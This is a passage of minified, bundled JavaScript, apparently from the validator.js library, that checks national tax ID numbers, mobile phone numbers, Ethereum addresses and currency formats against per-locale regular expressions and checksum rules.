            return Te % 11 === le[9]
        }
        function j(se) {
            for (var le = !1, Te = !1, Ue = 0; Ue < 3; Ue++)
                if (!le && /[AEIOU]/.test(se[Ue]))
                    le = !0;
                else if (!Te && le && se[Ue] === "X")
                    Te = !0;
                else if (Ue > 0 && (le && !Te && !/[AEIOU]/.test(se[Ue]) || Te && !/X/.test(se[Ue])))
                    return !1;
            return !0
        }
        function ee(se) {
            var le = se.toUpperCase().split("");
            if (!j(le.slice(0, 3)) || !j(le.slice(3, 6)))
                return !1;
            for (var Te = [6, 7, 9, 10, 12, 13, 14], Ue = {
                L: "0",
                M: "1",
                N: "2",
                P: "3",
                Q: "4",
                R: "5",
                S: "6",
                T: "7",
                U: "8",
                V: "9"
            }, Re = 0, $e = Te; Re < $e.length; Re++) {
                var st = $e[Re];
                le[st]in Ue && le.splice(st, 1, Ue[le[st]])
            }
            var yt = {
                A: "01",
                B: "02",
                C: "03",
                D: "04",
                E: "05",
                H: "06",
                L: "07",
                M: "08",
                P: "09",
                R: "10",
                S: "11",
                T: "12"
            }
              , vt = yt[le[8]]
              , Z = parseInt(le[9] + le[10], 10);
            Z > 40 && (Z -= 40),
            Z < 10 && (Z = "0".concat(Z));
            var N = "".concat(le[6]).concat(le[7], "/").concat(vt, "/").concat(Z);
            if (!(0,
            n.default)(N, "YY/MM/DD"))
                return !1;
            for (var U = 0, ne = 1; ne < le.length - 1; ne += 2) {
                var J = parseInt(le[ne], 10);
                isNaN(J) && (J = le[ne].charCodeAt(0) - 65),
                U += J
            }
            for (var Ee = {
                A: 1,
                B: 0,
                C: 5,
                D: 7,
                E: 9,
                F: 13,
                G: 15,
                H: 17,
                I: 19,
                J: 21,
                K: 2,
                L: 4,
                M: 18,
                N: 20,
                O: 11,
                P: 3,
                Q: 6,
                R: 8,
                S: 12,
                T: 14,
                U: 16,
                V: 10,
                W: 22,
                X: 25,
                Y: 24,
                Z: 23,
                0: 1,
                1: 0
            }, Ie = 0; Ie < le.length - 1; Ie += 2) {
                var re = 0;
                if (le[Ie]in Ee)
                    re = Ee[le[Ie]];
                else {
                    var Nt = parseInt(le[Ie], 10);
                    re = 2 * Nt + 1,
                    Nt > 4 && (re += 2)
                }
                U += re
            }
            return String.fromCharCode(65 + U % 26) === le[15]
        }
        function ie(se) {
            se = se.replace(/\W/, "");
            var le = se.slice(0, 2);
            if (le !== "32") {
                var Te = se.slice(2, 4);
                if (Te !== "00") {
                    var Ue = se.slice(4, 6);
                    switch (se[6]) {
                    case "0":
                        Ue = "18".concat(Ue);
                        break;
                    case "1":
                        Ue = "19".concat(Ue);
                        break;
                    default:
                        Ue = "20".concat(Ue);
                        break
                    }
                    var Re = "".concat(Ue, "/").concat(se.slice(2, 4), "/").concat(le);
                    if (!(0,
                    n.default)(Re, "YYYY/MM/DD"))
                        return !1
                }
                for (var $e = 1101, st = [1, 6, 3, 7, 9, 10, 5, 8, 4, 2], yt = 0; yt < se.length - 1; yt++)
                    $e -= parseInt(se[yt], 10) * st[yt];
                return parseInt(se[10], 10) === $e % 11
            }
            return !0
        }
        function ae(se) {
            if (se.length !== 9) {
                for (var le = se.toUpperCase().split(""); le.length < 8; )
                    le.unshift(0);
                switch (se[7]) {
                case "A":
                case "P":
                    if (parseInt(le[6], 10) === 0)
                        return !1;
                    break;
                default:
                    {
                        var Te = parseInt(le.join("").slice(0, 5), 10);
                        if (Te > 32e3)
                            return !1;
                        var Ue = parseInt(le.join("").slice(5, 7), 10);
                        if (Te === Ue)
                            return !1
                    }
                }
            }
            return !0
        }
        function he(se) {
            return i.reverseMultiplyAndSum(se.split("").slice(0, 8).map(function(le) {
                return parseInt(le, 10)
            }), 9) % 11 === parseInt(se[8], 10)
        }
        function me(se) {
            if (se.length === 10) {
                for (var le = [6, 5, 7, 2, 3, 4, 5, 6, 7], Te = 0, Ue = 0; Ue < le.length; Ue++)
                    Te += parseInt(se[Ue], 10) * le[Ue];
                return Te %= 11,
                Te === 10 ? !1 : Te === parseInt(se[9], 10)
            }
            var Re = se.slice(0, 2)
              , $e = parseInt(se.slice(2, 4), 10);
            $e > 80 ? (Re = "18".concat(Re),
            $e -= 80) : $e > 60 ? (Re = "22".concat(Re),
            $e -= 60) : $e > 40 ? (Re = "21".concat(Re),
            $e -= 40) : $e > 20 ? (Re = "20".concat(Re),
            $e -= 20) : Re = "19".concat(Re),
            $e < 10 && ($e = "0".concat($e));
            var st = "".concat(Re, "/").concat($e, "/").concat(se.slice(4, 6));
            if (!(0,
            n.default)(st, "YYYY/MM/DD"))
                return !1;
            for (var yt = 0, vt = 1, Z = 0; Z < se.length - 1; Z++)
                yt += parseInt(se[Z], 10) * vt % 10,
                vt += 2,
                vt > 10 ? vt = 1 : vt === 5 && (vt += 2);
            return yt = 10 - yt % 10,
            yt === parseInt(se[10], 10)
        }
        function Pe(se) {
            if (se.length === 11) {
                var le, Te;
                if (le = 0,
                se === "11111111111" || se === "22222222222" || se === "33333333333" || se === "44444444444" || se === "55555555555" || se === "66666666666" || se === "77777777777" || se === "88888888888" || se === "99999999999" || se === "00000000000")
                    return !1;
                for (var Ue = 1; Ue <= 9; Ue++)
                    le += parseInt(se.substring(Ue - 1, Ue), 10) * (11 - Ue);
                if (Te = le * 10 % 11,
                Te === 10 && (Te = 0),
                Te !== parseInt(se.substring(9, 10), 10))
                    return !1;
                le = 0;
                for (var Re = 1; Re <= 10; Re++)
                    le += parseInt(se.substring(Re - 1, Re), 10) * (12 - Re);
                return Te = le * 10 % 11,
                Te === 10 && (Te = 0),
                Te === parseInt(se.substring(10, 11), 10)
            }
            if (se === "00000000000000" || se === "11111111111111" || se === "22222222222222" || se === "33333333333333" || se === "44444444444444" || se === "55555555555555" || se === "66666666666666" || se === "77777777777777" || se === "88888888888888" || se === "99999999999999")
                return !1;
            for (var $e = se.length - 2, st = se.substring(0, $e), yt = se.substring($e), vt = 0, Z = $e - 7, N = $e; N >= 1; N--)
                vt += st.charAt($e - N) * Z,
                Z -= 1,
                Z < 2 && (Z = 9);
            var U = vt % 11 < 2 ? 0 : 11 - vt % 11;
            if (U !== parseInt(yt.charAt(0), 10))
                return !1;
            $e += 1,
            st = se.substring(0, $e),
            vt = 0,
            Z = $e - 7;
            for (var ne = $e; ne >= 1; ne--)
                vt += st.charAt($e - ne) * Z,
                Z -= 1,
                Z < 2 && (Z = 9);
            return U = vt % 11 < 2 ? 0 : 11 - vt % 11,
            U === parseInt(yt.charAt(1), 10)
        }
        function _e(se) {
            var le = 11 - i.reverseMultiplyAndSum(se.split("").slice(0, 8).map(function(Te) {
                return parseInt(Te, 10)
            }), 9) % 11;
            return le > 9 ? parseInt(se[8], 10) === 0 : le === parseInt(se[8], 10)
        }
        function Fe(se) {
            if (se.slice(0, 4) !== "9000") {
                var le = se.slice(1, 3);
                switch (se[0]) {
                case "1":
                case "2":
                    le = "19".concat(le);
                    break;
                case "3":
                case "4":
                    le = "18".concat(le);
                    break;
                case "5":
                case "6":
                    le = "20".concat(le);
                    break
                }
                var Te = "".concat(le, "/").concat(se.slice(3, 5), "/").concat(se.slice(5, 7));
                if (Te.length === 8) {
                    if (!(0,
                    n.default)(Te, "YY/MM/DD"))
                        return !1
                } else if (!(0,
                n.default)(Te, "YYYY/MM/DD"))
                    return !1;
                for (var Ue = se.split("").map(function(yt) {
                    return parseInt(yt, 10)
                }), Re = [2, 7, 9, 1, 4, 6, 3, 5, 8, 2, 7, 9], $e = 0, st = 0; st < Re.length; st++)
                    $e += Ue[st] * Re[st];
                return $e % 11 === 10 ? Ue[12] === 1 : Ue[12] === $e % 11
            }
            return !0
        }
        function Je(se) {
            if (se.length === 9) {
                if (se = se.replace(/\W/, ""),
                se.slice(6) === "000")
                    return !1;
                var le = parseInt(se.slice(0, 2), 10);
                if (le > 53)
                    return !1;
                le < 10 ? le = "190".concat(le) : le = "19".concat(le);
                var Te = parseInt(se.slice(2, 4), 10);
                Te > 50 && (Te -= 50),
                Te < 10 && (Te = "0".concat(Te));
                var Ue = "".concat(le, "/").concat(Te, "/").concat(se.slice(4, 6));
                if (!(0,
                n.default)(Ue, "YYYY/MM/DD"))
                    return !1
            }
            return !0
        }
        function rt(se) {
            var le = 11 - i.reverseMultiplyAndSum(se.split("").slice(0, 7).map(function(Te) {
                return parseInt(Te, 10)
            }), 8) % 11;
            return le === 10 ? parseInt(se[7], 10) === 0 : le === parseInt(se[7], 10)
        }
        function xt(se) {
            var le = se.slice(0);
            se.length > 11 && (le = le.slice(2));
            var Te = ""
              , Ue = le.slice(2, 4)
              , Re = parseInt(le.slice(4, 6), 10);
            if (se.length > 11)
                Te = se.slice(0, 4);
            else if (Te = se.slice(0, 2),
            se.length === 11 && Re < 60) {
                var $e = new Date().getFullYear().toString()
                  , st = parseInt($e.slice(0, 2), 10);
                if ($e = parseInt($e, 10),
                se[6] === "-")
                    parseInt("".concat(st).concat(Te), 10) > $e ? Te = "".concat(st - 1).concat(Te) : Te = "".concat(st).concat(Te);
                else if (Te = "".concat(st - 1).concat(Te),
                $e - parseInt(Te, 10) < 100)
                    return !1
            }
            Re > 60 && (Re -= 60),
            Re < 10 && (Re = "0".concat(Re));
            var yt = "".concat(Te, "/").concat(Ue, "/").concat(Re);
            if (yt.length === 8) {
                if (!(0,
                n.default)(yt, "YY/MM/DD"))
                    return !1
            } else if (!(0,
            n.default)(yt, "YYYY/MM/DD"))
                return !1;
            return i.luhnCheck(se.replace(/\W/, ""))
        }
        function Tt(se) {
            for (var le = se.split("").map(function($e) {
                return parseInt($e, 10)
            }), Te = [-1, 5, 7, 9, 4, 6, 10, 5, 7], Ue = 0, Re = 0; Re < Te.length; Re++)
                Ue += le[Re] * Te[Re];
            return Ue % 11 === 10 ? le[9] === 0 : le[9] === Ue % 11
        }
        var Qe = {
            "bg-BG": /^\d{10}$/,
            "cs-CZ": /^\d{6}\/{0,1}\d{3,4}$/,
            "de-AT": /^\d{9}$/,
            "de-DE": /^[1-9]\d{10}$/,
            "dk-DK": /^\d{6}-{0,1}\d{4}$/,
            "el-CY": /^[09]\d{7}[A-Z]$/,
            "el-GR": /^([0-4]|[7-9])\d{8}$/,
            "en-CA": /^\d{9}$/,
            "en-GB": /^\d{10}$|^(?!GB|NK|TN|ZZ)(?![DFIQUV])[A-Z](?![DFIQUVO])[A-Z]\d{6}[ABCD ]$/i,
            "en-IE": /^\d{7}[A-W][A-IW]{0,1}$/i,
            "en-US": /^\d{2}[- ]{0,1}\d{7}$/,
            "es-AR": /(20|23|24|27|30|33|34)[0-9]{8}[0-9]/,
            "es-ES": /^(\d{0,8}|[XYZKLM]\d{7})[A-HJ-NP-TV-Z]$/i,
            "et-EE": /^[1-6]\d{6}(00[1-9]|0[1-9][0-9]|[1-6][0-9]{2}|70[0-9]|710)\d$/,
            "fi-FI": /^\d{6}[-+A]\d{3}[0-9A-FHJ-NPR-Y]$/i,
            "fr-BE": /^\d{11}$/,
            "fr-FR": /^[0-3]\d{12}$|^[0-3]\d\s\d{2}(\s\d{3}){3}$/,
            "fr-LU": /^\d{13}$/,
            "hr-HR": /^\d{11}$/,
            "hu-HU": /^8\d{9}$/,
            "it-IT": /^[A-Z]{6}[L-NP-V0-9]{2}[A-EHLMPRST][L-NP-V0-9]{2}[A-ILMZ][L-NP-V0-9]{3}[A-Z]$/i,
            "lv-LV": /^\d{6}-{0,1}\d{5}$/,
            "mt-MT": /^\d{3,7}[APMGLHBZ]$|^([1-8])\1\d{7}$/i,
            "nl-NL": /^\d{9}$/,
            "pl-PL": /^\d{10,11}$/,
            "pt-BR": /(?:^\d{11}$)|(?:^\d{14}$)/,
            "pt-PT": /^\d{9}$/,
            "ro-RO": /^\d{13}$/,
            "sk-SK": /^\d{6}\/{0,1}\d{3,4}$/,
            "sl-SI": /^[1-9]\d{7}$/,
            "sv-SE": /^(\d{6}[-+]{0,1}\d{4}|(18|19|20)\d{6}[-+]{0,1}\d{4})$/,
            "uk-UA": /^\d{10}$/
        };
        Qe["lb-LU"] = Qe["fr-LU"],
        Qe["lt-LT"] = Qe["et-EE"],
        Qe["nl-BE"] = Qe["fr-BE"],
        Qe["fr-CA"] = Qe["en-CA"];
        var Ye = {
            "bg-BG": x,
            "cs-CZ": B,
            "de-AT": P,
            "de-DE": O,
            "dk-DK": F,
            "el-CY": D,
            "el-GR": I,
            "en-CA": E,
            "en-IE": M,
            "en-US": k,
            "es-AR": H,
            "es-ES": X,
            "et-EE": Y,
            "fi-FI": V,
            "fr-BE": R,
            "fr-FR": _,
            "fr-LU": $,
            "hr-HR": z,
            "hu-HU": K,
            "it-IT": ee,
            "lv-LV": ie,
            "mt-MT": ae,
            "nl-NL": he,
            "pl-PL": me,
            "pt-BR": Pe,
            "pt-PT": _e,
            "ro-RO": Fe,
            "sk-SK": Je,
            "sl-SI": rt,
            "sv-SE": xt,
            "uk-UA": Tt
        };
        Ye["lb-LU"] = Ye["fr-LU"],
        Ye["lt-LT"] = Ye["et-EE"],
        Ye["nl-BE"] = Ye["fr-BE"],
        Ye["fr-CA"] = Ye["en-CA"];
        var Bt = /[-\\\/!@#$%\^&\*\(\)\+\=\[\]]+/g
          , Dr = {
            "de-AT": Bt,
            "de-DE": /[\/\\]/g,
            "fr-BE": Bt
        };
        Dr["nl-BE"] = Dr["fr-BE"];
        function Cr(se) {
            var le = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : "en-US";
            (0,
            o.default)(se);
            var Te = se.slice(0);
            if (le in Qe)
                return le in Dr && (Te = Te.replace(Dr[le], "")),
                Qe[le].test(Te) ? le in Ye ? Ye[le](Te) : !0 : !1;
            throw new Error("Invalid locale '".concat(le, "'"))
        }
        r.exports = e.default,
        r.exports.default = e.default
    }(_b, _b.exports)),
    _b.exports
}
var _f = {}, vO;
function Fle() {
    if (vO)
        return _f;
    vO = 1,
    Object.defineProperty(_f, "__esModule", {
        value: !0
    }),
    _f.default = o,
    _f.locales = void 0;
    var r = e(Ve());
    function e(i) {
        return i && i.__esModule ? i : {
            default: i
        }
    }
    var t = {
        "am-AM": /^(\+?374|0)(33|4[134]|55|77|88|9[13-689])\d{6}$/,
        "ar-AE": /^((\+?971)|0)?5[024568]\d{7}$/,
        "ar-BH": /^(\+?973)?(3|6)\d{7}$/,
        "ar-DZ": /^(\+?213|0)(5|6|7)\d{8}$/,
        "ar-LB": /^(\+?961)?((3|81)\d{6}|7\d{7})$/,
        "ar-EG": /^((\+?20)|0)?1[0125]\d{8}$/,
        "ar-IQ": /^(\+?964|0)?7[0-9]\d{8}$/,
        "ar-JO": /^(\+?962|0)?7[789]\d{7}$/,
        "ar-KW": /^(\+?965)([569]\d{7}|41\d{6})$/,
        "ar-LY": /^((\+?218)|0)?(9[1-6]\d{7}|[1-8]\d{7,9})$/,
        "ar-MA": /^(?:(?:\+|00)212|0)[5-7]\d{8}$/,
        "ar-OM": /^((\+|00)968)?(9[1-9])\d{6}$/,
        "ar-PS": /^(\+?970|0)5[6|9](\d{7})$/,
        "ar-SA": /^(!?(\+?966)|0)?5\d{8}$/,
        "ar-SD": /^((\+?249)|0)?(9[012369]|1[012])\d{7}$/,
        "ar-SY": /^(!?(\+?963)|0)?9\d{8}$/,
        "ar-TN": /^(\+?216)?[2459]\d{7}$/,
        "az-AZ": /^(\+994|0)(10|5[015]|7[07]|99)\d{7}$/,
        "bs-BA": /^((((\+|00)3876)|06))((([0-3]|[5-6])\d{6})|(4\d{7}))$/,
        "be-BY": /^(\+?375)?(24|25|29|33|44)\d{7}$/,
        "bg-BG": /^(\+?359|0)?8[789]\d{7}$/,
        "bn-BD": /^(\+?880|0)1[13456789][0-9]{8}$/,
        "ca-AD": /^(\+376)?[346]\d{5}$/,
        "cs-CZ": /^(\+?420)? ?[1-9][0-9]{2} ?[0-9]{3} ?[0-9]{3}$/,
        "da-DK": /^(\+?45)?\s?\d{2}\s?\d{2}\s?\d{2}\s?\d{2}$/,
        "de-DE": /^((\+49|0)1)(5[0-25-9]\d|6([23]|0\d?)|7([0-57-9]|6\d))\d{7,9}$/,
        "de-AT": /^(\+43|0)\d{1,4}\d{3,12}$/,
        "de-CH": /^(\+41|0)([1-9])\d{1,9}$/,
        "de-LU": /^(\+352)?((6\d1)\d{6})$/,
        "dv-MV": /^(\+?960)?(7[2-9]|9[1-9])\d{5}$/,
        "el-GR": /^(\+?30|0)?6(8[5-9]|9(?![26])[0-9])\d{7}$/,
        "el-CY": /^(\+?357?)?(9(9|6)\d{6})$/,
        "en-AI": /^(\+?1|0)264(?:2(35|92)|4(?:6[1-2]|76|97)|5(?:3[6-9]|8[1-4])|7(?:2(4|9)|72))\d{4}$/,
        "en-AU": /^(\+?61|0)4\d{8}$/,
        "en-AG": /^(?:\+1|1)268(?:464|7(?:1[3-9]|[28]\d|3[0246]|64|7[0-689]))\d{4}$/,
        "en-BM": /^(\+?1)?441(((3|7)\d{6}$)|(5[0-3][0-9]\d{4}$)|(59\d{5}$))/,
        "en-BS": /^(\+?1[-\s]?|0)?\(?242\)?[-\s]?\d{3}[-\s]?\d{4}$/,
        "en-GB": /^(\+?44|0)7\d{9}$/,
        "en-GG": /^(\+?44|0)1481\d{6}$/,
        "en-GH": /^(\+233|0)(20|50|24|54|27|57|26|56|23|28|55|59)\d{7}$/,
        "en-GY": /^(\+592|0)6\d{6}$/,
        "en-HK": /^(\+?852[-\s]?)?[456789]\d{3}[-\s]?\d{4}$/,
        "en-MO": /^(\+?853[-\s]?)?[6]\d{3}[-\s]?\d{4}$/,
        "en-IE": /^(\+?353|0)8[356789]\d{7}$/,
        "en-IN": /^(\+?91|0)?[6789]\d{9}$/,
        "en-JM": /^(\+?876)?\d{7}$/,
        "en-KE": /^(\+?254|0)(7|1)\d{8}$/,
        "fr-CF": /^(\+?236| ?)(70|75|77|72|21|22)\d{6}$/,
        "en-SS": /^(\+?211|0)(9[1257])\d{7}$/,
        "en-KI": /^((\+686|686)?)?( )?((6|7)(2|3|8)[0-9]{6})$/,
        "en-KN": /^(?:\+1|1)869(?:46\d|48[89]|55[6-8]|66\d|76[02-7])\d{4}$/,
        "en-LS": /^(\+?266)(22|28|57|58|59|27|52)\d{6}$/,
        "en-MT": /^(\+?356|0)?(99|79|77|21|27|22|25)[0-9]{6}$/,
        "en-MU": /^(\+?230|0)?\d{8}$/,
        "en-MW": /^(\+?265|0)(((77|88|31|99|98|21)\d{7})|(((111)|1)\d{6})|(32000\d{4}))$/,
        "en-NA": /^(\+?264|0)(6|8)\d{7}$/,
        "en-NG": /^(\+?234|0)?[789]\d{9}$/,
        "en-NZ": /^(\+?64|0)[28]\d{7,9}$/,
        "en-PG": /^(\+?675|0)?(7\d|8[18])\d{6}$/,
        "en-PK": /^((00|\+)?92|0)3[0-6]\d{8}$/,
        "en-PH": /^(09|\+639)\d{9}$/,
        "en-RW": /^(\+?250|0)?[7]\d{8}$/,
        "en-SG": /^(\+65)?[3689]\d{7}$/,
        "en-SL": /^(\+?232|0)\d{8}$/,
        "en-TZ": /^(\+?255|0)?[67]\d{8}$/,
        "en-UG": /^(\+?256|0)?[7]\d{8}$/,
        "en-US": /^((\+1|1)?( |-)?)?(\([2-9][0-9]{2}\)|[2-9][0-9]{2})( |-)?([2-9][0-9]{2}( |-)?[0-9]{4})$/,
        "en-ZA": /^(\+?27|0)\d{9}$/,
        "en-ZM": /^(\+?26)?09[567]\d{7}$/,
        "en-ZW": /^(\+263)[0-9]{9}$/,
        "en-BW": /^(\+?267)?(7[1-8]{1})\d{6}$/,
        "es-AR": /^\+?549(11|[2368]\d)\d{8}$/,
        "es-BO": /^(\+?591)?(6|7)\d{7}$/,
        "es-CO": /^(\+?57)?3(0(0|1|2|4|5)|1\d|2[0-4]|5(0|1))\d{7}$/,
        "es-CL": /^(\+?56|0)[2-9]\d{1}\d{7}$/,
        "es-CR": /^(\+506)?[2-8]\d{7}$/,
        "es-CU": /^(\+53|0053)?5\d{7}$/,
        "es-DO": /^(\+?1)?8[024]9\d{7}$/,
        "es-HN": /^(\+?504)?[9|8|3|2]\d{7}$/,
        "es-EC": /^(\+?593|0)([2-7]|9[2-9])\d{7}$/,
        "es-ES": /^(\+?34)?[6|7]\d{8}$/,
        "es-PE": /^(\+?51)?9\d{8}$/,
        "es-MX": /^(\+?52)?(1|01)?\d{10,11}$/,
        "es-NI": /^(\+?505)\d{7,8}$/,
        "es-PA": /^(\+?507)\d{7,8}$/,
        "es-PY": /^(\+?595|0)9[9876]\d{7}$/,
        "es-SV": /^(\+?503)?[67]\d{7}$/,
        "es-UY": /^(\+598|0)9[1-9][\d]{6}$/,
        "es-VE": /^(\+?58)?(2|4)\d{9}$/,
        "et-EE": /^(\+?372)?\s?(5|8[1-4])\s?([0-9]\s?){6,7}$/,
        "fa-IR": /^(\+?98[\-\s]?|0)9[0-39]\d[\-\s]?\d{3}[\-\s]?\d{4}$/,
        "fi-FI": /^(\+?358|0)\s?(4[0-6]|50)\s?(\d\s?){4,8}$/,
        "fj-FJ": /^(\+?679)?\s?\d{3}\s?\d{4}$/,
        "fo-FO": /^(\+?298)?\s?\d{2}\s?\d{2}\s?\d{2}$/,
        "fr-BF": /^(\+226|0)[67]\d{7}$/,
        "fr-BJ": /^(\+229)\d{8}$/,
        "fr-CD": /^(\+?243|0)?(8|9)\d{8}$/,
        "fr-CM": /^(\+?237)6[0-9]{8}$/,
        "fr-FR": /^(\+?33|0)[67]\d{8}$/,
        "fr-GF": /^(\+?594|0|00594)[67]\d{8}$/,
        "fr-GP": /^(\+?590|0|00590)[67]\d{8}$/,
        "fr-MQ": /^(\+?596|0|00596)[67]\d{8}$/,
        "fr-PF": /^(\+?689)?8[789]\d{6}$/,
        "fr-RE": /^(\+?262|0|00262)[67]\d{8}$/,
        "fr-WF": /^(\+681)?\d{6}$/,
        "he-IL": /^(\+972|0)([23489]|5[012345689]|77)[1-9]\d{6}$/,
        "hu-HU": /^(\+?36|06)(20|30|31|50|70)\d{7}$/,
        "id-ID": /^(\+?62|0)8(1[123456789]|2[1238]|3[1238]|5[12356789]|7[78]|9[56789]|8[123456789])([\s?|\d]{5,11})$/,
        "ir-IR": /^(\+98|0)?9\d{9}$/,
        "it-IT": /^(\+?39)?\s?3\d{2} ?\d{6,7}$/,
        "it-SM": /^((\+378)|(0549)|(\+390549)|(\+3780549))?6\d{5,9}$/,
        "ja-JP": /^(\+81[ \-]?(\(0\))?|0)[6789]0[ \-]?\d{4}[ \-]?\d{4}$/,
        "ka-GE": /^(\+?995)?(79\d{7}|5\d{8})$/,
        "kk-KZ": /^(\+?7|8)?7\d{9}$/,
        "kl-GL": /^(\+?299)?\s?\d{2}\s?\d{2}\s?\d{2}$/,
        "ko-KR": /^((\+?82)[ \-]?)?0?1([0|1|6|7|8|9]{1})[ \-]?\d{3,4}[ \-]?\d{4}$/,
        "ky-KG": /^(\+?7\s?\+?7|0)\s?\d{2}\s?\d{3}\s?\d{4}$/,
        "lt-LT": /^(\+370|8)\d{8}$/,
        "lv-LV": /^(\+?371)2\d{7}$/,
        "mg-MG": /^((\+?261|0)(2|3)\d)?\d{7}$/,
        "mn-MN": /^(\+|00|011)?976(77|81|88|91|94|95|96|99)\d{6}$/,
        "my-MM": /^(\+?959|09|9)(2[5-7]|3[1-2]|4[0-5]|6[6-9]|7[5-9]|9[6-9])[0-9]{7}$/,
        "ms-MY": /^(\+?60|0)1(([0145](-|\s)?\d{7,8})|([236-9](-|\s)?\d{7}))$/,
        "mz-MZ": /^(\+?258)?8[234567]\d{7}$/,
        "nb-NO": /^(\+?47)?[49]\d{7}$/,
        "ne-NP": /^(\+?977)?9[78]\d{8}$/,
        "nl-BE": /^(\+?32|0)4\d{8}$/,
        "nl-NL": /^(((\+|00)?31\(0\))|((\+|00)?31)|0)6{1}\d{8}$/,
        "nl-AW": /^(\+)?297(56|59|64|73|74|99)\d{5}$/,
        "nn-NO": /^(\+?47)?[49]\d{7}$/,
        "pl-PL": /^(\+?48)? ?([5-8]\d|45) ?\d{3} ?\d{2} ?\d{2}$/,
        "pt-BR": /^((\+?55\ ?[1-9]{2}\ ?)|(\+?55\ ?\([1-9]{2}\)\ ?)|(0[1-9]{2}\ ?)|(\([1-9]{2}\)\ ?)|([1-9]{2}\ ?))((\d{4}\-?\d{4})|(9[1-9]{1}\d{3}\-?\d{4}))$/,
        "pt-PT": /^(\+?351)?9[1236]\d{7}$/,
        "pt-AO": /^(\+244)\d{9}$/,
        "ro-MD": /^(\+?373|0)((6(0|1|2|6|7|8|9))|(7(6|7|8|9)))\d{6}$/,
        "ro-RO": /^(\+?40|0)\s?7\d{2}(\/|\s|\.|-)?\d{3}(\s|\.|-)?\d{3}$/,
        "ru-RU": /^(\+?7|8)?9\d{9}$/,
        "si-LK": /^(?:0|94|\+94)?(7(0|1|2|4|5|6|7|8)( |-)?)\d{7}$/,
        "sl-SI": /^(\+386\s?|0)(\d{1}\s?\d{3}\s?\d{2}\s?\d{2}|\d{2}\s?\d{3}\s?\d{3})$/,
        "sk-SK": /^(\+?421)? ?[1-9][0-9]{2} ?[0-9]{3} ?[0-9]{3}$/,
        "so-SO": /^(\+?252|0)((6[0-9])\d{7}|(7[1-9])\d{7})$/,
        "sq-AL": /^(\+355|0)6[789]\d{6}$/,
        "sr-RS": /^(\+3816|06)[- \d]{5,9}$/,
        "sv-SE": /^(\+?46|0)[\s\-]?7[\s\-]?[02369]([\s\-]?\d){7}$/,
        "tg-TJ": /^(\+?992)?[5][5]\d{7}$/,
        "th-TH": /^(\+66|66|0)\d{9}$/,
        "tr-TR": /^(\+?90|0)?5\d{9}$/,
        "tk-TM": /^(\+993|993|8)\d{8}$/,
        "uk-UA": /^(\+?38|8)?0\d{9}$/,
        "uz-UZ": /^(\+?998)?(6[125-79]|7[1-69]|88|9\d)\d{7}$/,
        "vi-VN": /^((\+?84)|0)((3([2-9]))|(5([25689]))|(7([0|6-9]))|(8([1-9]))|(9([0-9])))([0-9]{7})$/,
        "zh-CN": /^((\+|00)86)?(1[3-9]|9[28])\d{9}$/,
        "zh-TW": /^(\+?886\-?|0)?9\d{8}$/,
        "dz-BT": /^(\+?975|0)?(17|16|77|02)\d{6}$/,
        "ar-YE": /^(((\+|00)9677|0?7)[0137]\d{7}|((\+|00)967|0)[1-7]\d{6})$/,
        "ar-EH": /^(\+?212|0)[\s\-]?(5288|5289)[\s\-]?\d{5}$/,
        "fa-AF": /^(\+93|0)?(2{1}[0-8]{1}|[3-5]{1}[0-4]{1})(\d{7})$/
    };
    t["en-CA"] = t["en-US"],
    t["fr-CA"] = t["en-CA"],
    t["fr-BE"] = t["nl-BE"],
    t["zh-HK"] = t["en-HK"],
    t["zh-MO"] = t["en-MO"],
    t["ga-IE"] = t["en-IE"],
    t["fr-CH"] = t["de-CH"],
    t["it-CH"] = t["fr-CH"];
    function o(i, n, s) {
        if ((0,
        r.default)(i),
        s && s.strictMode && !i.startsWith("+"))
            return !1;
        if (Array.isArray(n))
            return n.some(function(f) {
                if (t.hasOwnProperty(f)) {
                    var h = t[f];
                    if (h.test(i))
                        return !0
                }
                return !1
            });
        if (n in t)
            return t[n].test(i);
        if (!n || n === "any") {
            for (var a in t)
                if (t.hasOwnProperty(a)) {
                    var l = t[a];
                    if (l.test(i))
                        return !0
                }
            return !1
        }
        throw new Error("Invalid locale '".concat(n, "'"))
    }
    return _f.locales = Object.keys(t),
    _f
}
var Ib = {
    exports: {}
}, TO;
function Ule() {
    return TO || (TO = 1,
    function(r, e) {
        Object.defineProperty(e, "__esModule", {
            value: !0
        }),
        e.default = n;
        var t = o(Ve());
        function o(s) {
            return s && s.__esModule ? s : {
                default: s
            }
        }
        var i = /^(0x)[0-9a-f]{40}$/i;
        function n(s) {
            return (0,
            t.default)(s),
            i.test(s)
        }
        r.exports = e.default,
        r.exports.default = e.default
    }(Ib, Ib.exports)),
    Ib.exports
}
var Ob = {
    exports: {}
}, EO;
function kle() {
    return EO || (EO = 1,
    function(r, e) {
        Object.defineProperty(e, "__esModule", {
            value: !0
        }),
        e.default = a;
        var t = i(wo())
          , o = i(Ve());
        function i(l) {
            return l && l.__esModule ? l : {
                default: l
            }
        }
        function n(l) {
            var f = "\\d{".concat(l.digits_after_decimal[0], "}");
            l.digits_after_decimal.forEach(function(P, O) {
                O !== 0 && (f = "".concat(f, "|\\d{").concat(P, "}"))
            });
            var h = "(".concat(l.symbol.replace(/\W/, function(P) {
                return "\\".concat(P)
            }), ")").concat(l.require_symbol ? "" : "?")
              , p = "-?"
              , b = "[1-9]\\d*"
              , v = "[1-9]\\d{0,2}(\\".concat(l.thousands_separator, "\\d{3})*")
              , T = ["0", b, v]
              , x = "(".concat(T.join("|"), ")?")
              , E = "(\\".concat(l.decimal_separator, "(").concat(f, "))").concat(l.require_decimal ? "" : "?")
              , B = x + (l.allow_decimal || l.require_decimal ? E : "");
            return l.allow_negatives && !l.parens_for_negatives && (l.negative_sign_after_digits ? B += p : l.negative_sign_before_digits && (B = p + B)),
            l.allow_negative_sign_placeholder ? B = "( (?!\\-))?".concat(B) : l.allow_space_after_symbol ? B = " ?".concat(B) : l.allow_space_after_digits && (B += "( (?!$))?"),
            l.symbol_after_digits ? B += h : B = h + B,
            l.allow_negatives && (l.parens_for_negatives ? B = "(\\(".concat(B, "\\)|").concat(B, ")") : l.negative_sign_before_digits || l.negative_sign_after_digits || (B = p + B)),
            new RegExp("^(?!-? )(?=.*\\d)".concat(B, "$"))
        }
        var s = {
            symbol: "$",
            require_symbol: !1,
            allow_space_after_symbol: !1,
            symbol_after_digits: !1,
            allow_negatives: !0,
            parens_for_negatives: !1,
            negative_sign_before_digits: !1,
            negative_sign_after_digits: !1,
            allow_negative_sign_placeholder: !1,
            thousands_separator: ",",
            decimal_separator: ".",
            allow_decimal: !0,
            require_decimal: !1,
